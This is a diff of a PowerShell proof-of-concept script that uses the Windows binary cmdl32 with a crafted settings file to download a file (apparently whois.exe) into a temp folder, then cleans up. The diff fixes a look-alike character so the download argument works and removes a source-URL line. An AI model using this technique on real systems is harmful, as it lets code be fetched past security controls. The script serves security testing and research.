@@ -25,7 +25,7 @@ Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
 Write-Host "[*] Performing download with cmdl32"
 # Assuming cmdl32 is in system32 or accessible
 $cmdl32Path = "cmdl32"
-$arguments = "/vpn /ᴸan `"$tempDir\settings.txt`""
+$arguments = "/vpn /lan `"$tempDir\settings.txt`""
 try {
     Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with cmdl32."
@@ -72,5 +72,3 @@ Write-Host "[*] Cleaning up downloaded file"
 Remove-Item -Path "$tempDir\whois.exe" -Force
 Remove-Item -Path "$tempDir\settings.txt" -Force
 Write-Host "[*] Script complete."
-
-From <https://raw.githubusercontent.com/fuzzlove/h4v0k/refs/heads/main/cmdl32dlr.ps1> 
